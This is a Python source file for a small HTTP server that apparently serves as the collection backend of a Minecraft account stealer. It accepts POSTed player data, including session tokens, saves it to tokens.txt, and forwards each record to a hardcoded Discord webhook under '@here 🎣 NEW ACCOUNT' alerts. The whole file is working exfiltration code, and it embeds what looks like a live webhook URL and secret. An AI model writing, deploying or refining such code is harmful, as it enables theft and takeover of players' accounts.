from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import urllib.request
import urllib.error
import html

DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1457853928082247785/sbu1wSV0HVvimlh0CZhvhRpnAoX90fj6eMfN2SUHw6Gfh2FsVulYaeM4A2Ely-quGs94"

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            length = int(self.headers['Content-Length'])
            data = json.loads(self.rfile.read(length).decode())
            
            # Get ALL fields with proper defaults
            username = data.get('username', 'Unknown').strip()
            uuid = data.get('uuid', '').strip()
            server = data.get('server', '').strip()
            token = data.get('token', '').strip()
            money = data.get('money', '0').strip()
            playtime = data.get('playtime', '0h').strip()
            kills = data.get('kills', '0').strip()
            deaths = data.get('deaths', '0').strip()
            skin = data.get('skin', '').strip()
            log_type = data.get('type', 'login').strip()
            
            print(f"Got: {username} on {server}")
            
            # Save to file
            with open('tokens.txt', 'a') as f:
                f.write(f"{username} | {uuid} | {server} | {token[:50]}... | {money} | {playtime} | {kills} | {deaths}\n")
            
            # Prepare sanitized data for Discord
            # Clean and truncate token to avoid Discord limits
            safe_token = token[:900] + ("..." if len(token) > 900 else "")
            safe_username = html.escape(username[:256])
            safe_server = html.escape(server[:256])
            
            # Send ONE request to Discord with both content and embed
            try:
                headers = {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0'
                }
                
                # Create embed with safe, truncated data
                embed = {
                    "title": f"🎣 ACCOUNT - {safe_username}",
                    "description": f"**Username:** `{safe_username}`\n**UUID:** `{uuid}`\n**Server:** `{safe_server}`\n**Money:** `{money}`\n**Playtime:** `{playtime}`\n**K/D Ratio:** `{kills}/{deaths}`",
                    "fields": [
                        {
                            "name": "Token (Truncated)",
                            "value": f"```{safe_token}```",
                            "inline": False
                        }
                    ],
                    "color": 65280,
                    "thumbnail": {"url": skin if skin else f"https://mc-heads.net/head/{uuid.replace('-', '')}"}
                }
                
                # Send ONE message with @here and embed together
                discord_data = {
                    "content": "@here 🎣 NEW ACCOUNT",
                    "embeds": [embed]
                }
                
                req_data = json.dumps(discord_data).encode()
                req = urllib.request.Request(DISCORD_WEBHOOK, data=req_data, headers=headers)
                response = urllib.request.urlopen(req, timeout=10)
                print(f"Sent to Discord: Status {response.status}")
                
            except urllib.error.HTTPError as e:
                print(f"Discord HTTP error: {e.code} - {e.reason}")
                # Try to read error response
                try:
                    error_body = e.read().decode()
                    print(f"Error details: {error_body}")
                except:
                    pass
            except Exception as e:
                print(f"Discord error: {type(e).__name__}: {e}")
            
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK')
            
        except json.JSONDecodeError as e:
            print(f"JSON decode error: {e}")
            self.send_response(400)
            self.end_headers()
            self.wfile.write(b'Invalid JSON')
        except Exception as e:
            print(f"Server error: {type(e).__name__}: {e}")
            self.send_response(500)
            self.end_headers()
    
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Server running')
    
    def log_message(self, format, *args):
        # Suppress default logging
        pass

print("🚀 Server starting on port 5000")
server = HTTPServer(('0.0.0.0', 5000), Handler)
server.serve_forever()
